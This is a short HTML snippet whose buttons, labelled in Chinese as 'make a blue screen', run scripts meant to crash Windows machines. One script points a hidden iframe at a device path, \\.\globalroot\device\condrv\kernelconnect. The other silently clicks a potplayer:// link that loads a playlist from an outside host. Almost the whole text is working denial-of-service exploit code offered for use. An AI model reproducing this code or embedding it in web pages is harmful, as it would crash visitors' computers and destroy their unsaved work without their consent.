    <button onclick="makeBSOD();">制造蓝屏(Firefox/旧EDGE/IE)</button>
    <button onclick="makeBSODm3u8();">制造蓝屏(Chrome系,使用PotPlayer)</button>
    <iframe id="BSODframe" style="display:none;"></iframe>
    <script>
        function makeBSOD(){
            //在edge和firefox上可用
            document.getElementById("BSODframe").src="file:///\\.\\globalroot\\device\\condrv\\kernelconnect"
        }
        function makeBSODm3u8(){
            //借助PotPlayer实现
            var a = document.createElement('a');
            a.style.display = 'none';
            a.href = "potplayer://https://bsod.qinlili.bid/playlist.m3u8";
            document.body.appendChild(a);
            a.click();
        }
    </script>
